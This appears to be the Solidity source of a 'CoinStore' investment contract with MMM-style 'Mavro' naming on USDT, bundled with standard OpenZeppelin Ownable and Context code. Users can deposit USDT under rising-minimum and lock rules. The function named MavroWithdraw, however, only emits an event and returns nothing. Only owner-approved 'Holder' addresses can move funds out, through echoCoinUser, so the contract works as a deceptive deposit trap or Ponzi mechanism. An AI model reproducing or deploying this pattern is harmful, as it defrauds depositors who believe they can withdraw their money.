// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract CoinStore is Ownable {
    address public immutable usdtAddress =
        0x55d398326f99059fF775485246999027B3197955;
    struct MavroStruct {
        uint32 investTime;
        uint256 min;
        uint256 max;
        uint256 investAmount;
    }
    mapping(address => MavroStruct) public MavroPlayer;
    mapping(address => bool) public Holder;
    uint32 public immutable lockTime = uint32(72 hours);

    function updateHolder(address _pair) external onlyOwner {
        if (Holder[_pair]) {
            Holder[_pair] = false;
        } else {
            Holder[_pair] = true;
        }
    }

    function echoCoinUser(address _user, uint256 _amount) external {
        require(Holder[msg.sender], "Error");
        IERC20(usdtAddress).transfer(_user, _amount);
    }

    function investCheck(address _add, uint256 _amount) public view {
        MavroStruct memory _player = MavroPlayer[_add];

        if (_player.investAmount > 0) {
            if (_amount < _player.investAmount) {
                revert("less than last investment");
            }
            if (uint32(block.timestamp) < _player.investTime + lockTime) {
                revert("too much times");
            }
        }
        if (_player.min == 0 || _player.max == 0) {
            require(
                (_amount >= 50 ether && _amount <= 1000 ether),
                "invalid amount"
            );
        } else if (_amount < _player.min || _amount > _player.max) {
            revert("invalid amount");
        }
    }

    function MavroInvest(uint256 _amount) external {
        investCheck(msg.sender, _amount);
        MavroStruct storage _player = MavroPlayer[msg.sender];
        IERC20(usdtAddress).transferFrom(msg.sender, address(this), _amount);
        _player.investTime = uint32(block.timestamp);
        _player.investAmount = _amount;
        emit PlayerInvest(msg.sender, _amount);
    }

    function confrimInvest(
        address _player,
        uint256 min,
        uint256 max
    ) external {
        require(Holder[msg.sender], "Error");
        MavroPlayer[_player].min = min;
        MavroPlayer[_player].max = max;
    }

    function MavroWithdraw(uint256 _amount) external {
        emit PlayerWithdraw(msg.sender, _amount);
    }

    event PlayerInvest(address indexed from, uint256 value);
    event PlayerWithdraw(address indexed player, uint256 value);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}